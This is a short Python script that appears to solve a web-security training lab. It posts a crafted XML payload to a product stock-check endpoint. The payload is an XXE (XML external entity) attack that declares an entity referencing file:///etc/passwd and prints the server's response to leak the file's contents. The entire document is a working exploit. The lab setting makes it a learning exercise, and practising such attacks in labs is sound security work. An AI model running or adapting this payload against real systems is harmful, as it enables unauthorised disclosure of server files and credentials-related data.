import requests

# The URL of the stock check endpoint
stock_url = 'https://0a7900c8049275dc831f23c3006900ac.web-security-academy.net/product/stock'  # Replace with the correct URL from the request

# Constructing the malicious XML payload for the XXE attack
xml_post_data = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'''

# Make the POST request with the crafted XML payload
s = requests.Session()
resp = s.post(stock_url, data=xml_post_data)

# Print the response to see if we get the contents of /etc/passwd
print(resp.text)
